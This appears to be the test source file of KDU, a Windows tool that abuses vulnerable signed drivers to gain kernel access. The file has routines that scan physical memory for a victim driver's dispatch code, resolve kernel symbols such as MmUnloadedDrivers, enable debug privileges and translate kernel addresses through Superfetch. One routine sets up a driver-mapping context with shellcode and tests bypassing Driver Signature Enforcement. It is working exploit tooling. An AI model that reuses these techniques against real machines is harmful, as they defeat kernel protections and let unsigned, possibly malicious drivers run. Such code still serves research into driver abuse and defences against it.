/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       TESTS.CPP
*
*  VERSION:     1.48
*
*  DATE:        30 May 2026
*
*  KDU tests.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "test_dsefix.h"

VOID KDUTestLoad()
{
    ULONG i;
    HINSTANCE hProv;
    PKDU_DB provLoadData;
    ULONG dataSize = 0;
    PVOID pvData;

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    provLoadData = KDUReferenceLoadDB();
    if (provLoadData == NULL)
        return;

    for (i = 0; i < provLoadData->NumberOfEntries; i++) {

        pvData = KDULoadResource(provLoadData->Entries[i].ResourceId,
            hProv,
            &dataSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (pvData) {
            printf_s("[+] Provider[%lu] loaded\r\n", provLoadData->Entries[i].ResourceId);
            supHeapFree(pvData);
        }
        else {
            printf_s("[+] Provider[%lu] failed to load\r\n", provLoadData->Entries[i].ResourceId);
        }
    }
}

BOOL WINAPI TestPhysMemEnumCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{

    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;

    ULONG signatureSize = Params->DispatchSignatureLength;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (Params->ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(Params->DispatchSignature,
            RtlOffsetToPointer(buffer, Params->DispatchHandlerPageOffset),
            signatureSize))
        {
            printf_s("\t Found code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;
        }
    }

    return FALSE;
}

VOID TestBrute(PKDU_CONTEXT Context)
{
    KDU_PHYSMEM_ENUM_PARAMS params;
    VICTIM_IMAGE_INFORMATION vi;
    HANDLE victimDeviceHandle = NULL;

    if (Context->Provider->Callbacks.ReadPhysicalMemory == NULL)
        return;

    if (VpCreate(Context->Victim, Context->ModuleBase, &victimDeviceHandle, NULL, NULL)) {

        RtlSecureZeroMemory(&vi, sizeof(vi));
        VpQueryInformation(Context->Victim, VictimImageInformation, &vi, sizeof(vi));

        params.DeviceHandle = Context->DeviceHandle;
        params.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
        params.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

        params.DispatchSignature = Context->Victim->Data.DispatchSignature;
        params.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

        params.DispatchHandlerOffset = vi.DispatchOffset;
        params.DispatchHandlerPageOffset = vi.DispatchPageOffset;
        params.JmpAddress = vi.JumpValue;

        params.bWrite = FALSE;
        params.cbPayload = 0;
        params.pvPayload = NULL;
        params.ccPagesFound = 0;
        params.ccPagesModified = 0;

        if (supEnumeratePhysicalMemory(TestPhysMemEnumCallback, &params)) {

            printf_s("[+] Number of pages found: %llu\r\n", params.ccPagesFound);

        }
    }
}

VOID TestSymbols()
{
    if (symInit()) {

        supResolveMiPteBaseAddress(0);

        HMODULE hModule = LoadLibraryEx(NTOSKRNL_EXE, NULL, DONT_RESOLVE_DLL_REFERENCES);

        if (hModule) {

            ULONG_PTR ntosBase = supGetNtOsBase();

            if (symLoadImageSymbols(NTOSKRNL_EXE, (PVOID)hModule, 0)) {

                ULONG_PTR address = 0;

                ///MmUnloadedDrivers
                if (symLookupAddressBySymbol("MmUnloadedDrivers", &address)) {

                    printf_s("[X] symbol address %llX\r\n\tkm address %llX\r\n",
                        address,
                        (ULONG_PTR)ntosBase + address - (ULONG_PTR)hModule);
                }

            }

        }
    }
}

VOID TestSuperfetch(PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    SUPERFETCH_MEMORY_MAP memoryMap;
    ULONG_PTR ntosBase;
    ULONG_PTR physAddress;

    UNREFERENCED_PARAMETER(Context);

    RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);

    printf_s("[*] Building Superfetch memory map...\n");

    if (!supBuildSuperfetchMemoryMap(&memoryMap)) {
        printf_s("[-] Failed to build memory map\n");
        return;
    }

    printf_s("[+] Memory map built: %llu entries from %lu ranges\n",
        memoryMap.TableSize, memoryMap.RangeCount);

    ntosBase = supGetNtOsBase();
    printf_s("[*] ntoskrnl base: 0x%llX\n", ntosBase);

    if (supSuperfetchVirtualToPhysical(&memoryMap, ntosBase, &physAddress)) {
        printf_s("[+] Translated to physical: 0x%llX\n", physAddress);
    }
    else {
        printf_s("[-] Translation failed\n");
    }

    supFreeSuperfetchMemoryMap(&memoryMap);
}

VOID TestSuperfetchWithDriver(PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    SUPERFETCH_MEMORY_MAP memoryMap;
    ULONG_PTR ntosBase;
    ULONG_PTR physAddress;
    USHORT dosSignature = 0;
    KDU_PROVIDER* prov = Context->Provider;

    RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);

    supPrintfEvent(kduEventInformation,
        "[+] Building Superfetch memory map...\n");

    if (!supBuildSuperfetchMemoryMap(&memoryMap)) {
        supPrintfEvent(kduEventError,
            "[-] Failed to build memory map\n");
        return;
    }

    supPrintfEvent(kduEventInformation,
        "[+] Memory map built: %llu entries from %lu ranges\n",
        memoryMap.TableSize, memoryMap.RangeCount);

    ntosBase = supGetNtOsBase();
    supPrintfEvent(kduEventInformation,
        "[+] ntoskrnl base: 0x%llX\n", ntosBase);

    if (!supSuperfetchVirtualToPhysical(&memoryMap, ntosBase, &physAddress)) {
        supPrintfEvent(kduEventError,
            "[-] Translation failed\n");
        supFreeSuperfetchMemoryMap(&memoryMap);
        return;
    }

    supPrintfEvent(kduEventInformation,
        "[+] Translated to physical: 0x%llX\n", physAddress);

    //
    // Read MZ signature via physical memory
    //
    if (prov->Callbacks.ReadPhysicalMemory(
        Context->DeviceHandle,
        physAddress,
        &dosSignature,
        sizeof(dosSignature)))
    {
        if (dosSignature == IMAGE_DOS_SIGNATURE) {
            supPrintfEvent(kduEventInformation,
                "[+] MZ signature verified - translation OK\n");
        }
        else {
            supPrintfEvent(kduEventError,
                "[-] MZ signature mismatch: 0x%04X\n", dosSignature);
        }
    }
    else {
        supPrintfEvent(kduEventError,
            "[-] Failed to read physical memory\n");
    }

    //
    // Test virtual memory read via provider
    //
    dosSignature = 0;
    if (prov->Callbacks.ReadKernelVM(
        Context->DeviceHandle,
        ntosBase,
        &dosSignature,
        sizeof(dosSignature)))
    {
        if (dosSignature == IMAGE_DOS_SIGNATURE) {
            supPrintfEvent(kduEventInformation,
                "[+] Virtual memory read verified - MZ signature OK\n");
        }
        else {
            supPrintfEvent(kduEventError,
                "[-] Virtual memory read MZ mismatch: 0x%04X\n", dosSignature);
        }
    }
    else {
        supPrintfEvent(kduEventError,
            "[-] Failed to read virtual memory\n");
    }

    supFreeSuperfetchMemoryMap(&memoryMap);

    supPrintfEvent(kduEventInformation,
        "[+] All tests completed\n");
}

VOID KDUTest()
{
    PKDU_CONTEXT Context;

    //KDURunCiQueryTests();

    //KDUTestLoad();
    //TestSymbols();
    //KDUTestDSEQuery(NT_WIN11_24H2);
    Context = KDUProviderCreate(KDU_PROVIDER_MATROX_MTXC9CB,
        FALSE,
        NT_WIN10_20H1,
        KDU_SHELLCODE_V1,
        ActionTypeMapDriver);

    if (Context) {
        //TestSuperfetch(Context);
        //TestSuperfetchWithDriver(Context);
        //TestBrute(Context);
        KDUTestDSE(Context);

        KDUProviderRelease(Context);
    }
}
